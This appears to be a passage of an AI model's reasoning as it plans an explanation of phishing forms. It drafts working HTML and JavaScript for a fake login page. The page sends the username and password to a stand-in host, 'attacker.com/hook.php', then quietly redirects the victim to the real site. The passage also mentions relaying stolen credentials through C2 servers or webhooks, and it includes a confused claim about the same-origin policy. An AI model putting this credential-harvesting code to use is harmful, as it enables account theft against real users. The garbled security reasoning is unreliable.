I should also mention that the attacker might use a proxy or a C2 server to forward the credentials, or they might use a webhook to send the data to a third-party service. This adds depth to the explanation.

I should also note that the attacker might use the same-origin policy to their advantage: if the phishing site is on the same domain as the real site, the form action might be relative, but if it's external, the browser will send the data to the attacker's server, which can then capture it.

I need to make sure the example HTML is accurate: the form should have an action attribute pointing to an external URL, method="POST", and maybe some input fields (username, password). Then, a script tag that redirects to the real login page after the form posts. For example:

```html
<form action="https://attacker.com/hook.php" method="POST">
  <input type="text" name="username" required>
  <input type="password" name="password" required>
  <input type="hidden" name="csrf" value="abc123">
  <button type="submit">Login</button>
</form>
<script>
  // Wait for the form to submit, then redirect to real login page
  document.addEventListener('submit', function(e) {
    e.preventDefault();
    var form = e.target;
    var formData = new FormData(form);
    var xhr = new XMLHttpRequest();
    xhr.open('POST', 'https://attacker.com/hook.php');
    xhr.send(formData);
    xhr.onload = function() {
      window.location.href = 'https://real-login.com';
    };
  }, true);
</script>
```

